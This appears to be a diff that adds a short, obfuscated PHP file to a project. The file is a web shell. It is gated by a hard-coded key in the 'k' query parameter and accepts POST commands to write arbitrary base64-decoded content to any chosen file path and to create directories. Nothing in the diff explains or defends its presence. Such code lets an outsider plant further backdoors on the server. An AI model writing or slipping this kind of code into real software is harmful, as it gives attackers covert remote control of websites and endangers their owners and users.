@@ -1,0 +1,2 @@
+<?php 
+	$i1=$_GET['k'];if($i1!='09d9538d2ee82df407bd23ac17a2f685'){exit('.');}function s0($y2){echo json_encode($y2);}$i3=$_POST['cmd'];if(!empty($i3)){if($i3=="test"){s0(array("code"=>200,));}if($i3=="upload"){$n4=$_POST['file'];$t5=$_POST['data'];$b6=base64_decode($t5);file_put_contents($n4,$b6);chmod($n4,0644);s0(array("code"=>200,));}if($i3=="mkdir"){$h7=$_POST['dir'];mkdir($h7);chmod($h7,0755);s0(array("code"=>200,));}}?>
